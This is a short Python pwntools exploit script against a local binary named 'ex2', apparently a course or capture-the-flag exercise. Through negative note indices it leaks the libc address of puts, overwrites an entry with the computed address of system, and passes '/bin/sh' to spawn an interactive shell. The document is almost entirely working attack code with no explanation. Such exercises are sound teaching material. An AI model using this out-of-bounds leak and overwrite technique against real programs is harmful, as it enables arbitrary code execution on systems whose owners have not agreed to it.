#!/usr/bin/env python3

from pwn import *
context.arch = "amd64"


def extract_address(s):
    leaked_bytes = s[s.find(b"]:") + 3 :].strip()
    return struct.unpack("<Q", leaked_bytes.ljust(8, b"\x00"))[0]


def read_menu():
    s = io.recvline()
    print(s)
    s = io.recvline()
    print(s)
    s = io.recvline()
    print(s)
    s = io.recvline()
    print(s)
    s = io.recvline()
    print(s)
    s = io.recvline()
    print(s)


io = gdb.debug(
    "./bin/ex2",
    """
    break ex2.c:40
    c
    c
    """,
    terminal=["gnome-terminal", "--geometry=160x80", "-e"],
)

system_offset = -0x300E0
# shell_str_offset = "0x11e6b1"


# io.sendline("-6")
# io.sendline(b"A" * 8)


# first lets try to leak the address of printf

io.sendline("5")  # do this to call puts once

io.sendline("2")  # use notes read to leak puts
io.sendline("-6")

io.sendline("1")
io.sendline("0")
io.sendline("/bin/sh")


read_menu()

s = io.recvline()
print(s)

read_menu()

puts_leak_line = io.recvline()
puts_leak = extract_address(puts_leak_line)
print(hex(puts_leak))

io.sendline("1")
io.sendline("-5")
io.send(p64(puts_leak + system_offset)[:-1] + b"\n")

print("HEREEEE", p64(puts_leak + system_offset)[:-1] + b"\n")

io.sendline("1")
io.sendline("0")


read_menu()
read_menu()
read_menu()
io.recvline()


io.interactive()
